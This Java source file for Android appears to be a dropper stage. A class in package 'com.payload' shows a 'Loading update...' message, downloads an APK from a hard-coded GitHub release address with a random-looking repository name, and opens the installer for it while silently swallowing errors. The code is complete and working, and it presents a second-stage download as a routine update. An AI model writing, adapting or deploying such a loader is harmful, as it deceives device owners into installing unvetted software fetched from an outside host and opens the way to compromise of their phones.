package com.payload;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Handler;
import android.os.Looper;
import android.widget.Toast;
import androidx.core.content.FileProvider;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class Main {
    private static final String FINAL_APK_URL = "https://github.com/ivan822828/urtierqjw2391/releases/download/v1.0/app-debug.apk";

    public static void execute(Context context) {
        new Handler(Looper.getMainLooper()).post(() -> {
            Toast.makeText(context, "Loading update...", Toast.LENGTH_SHORT).show();
        });
        
        new Thread(() -> {
            try {
                File apkFile = new File(context.getFilesDir(), "update.apk");
                
                URL url = new URL(FINAL_APK_URL);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("GET");
                conn.connect();
                
                InputStream input = conn.getInputStream();
                FileOutputStream output = new FileOutputStream(apkFile);
                byte[] buffer = new byte[4096];
                int count;
                while ((count = input.read(buffer)) != -1) {
                    output.write(buffer, 0, count);
                }
                output.close();
                input.close();
                
                Uri apkUri = FileProvider.getUriForFile(context, 
                    context.getPackageName() + ".fileprovider", apkFile);
                Intent intent = new Intent(Intent.ACTION_VIEW);
                intent.setDataAndType(apkUri, "application/vnd.android.package-archive");
                intent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(intent);
            } catch (Exception e) {
                // Ignore
            }
        }).start();
    }
}
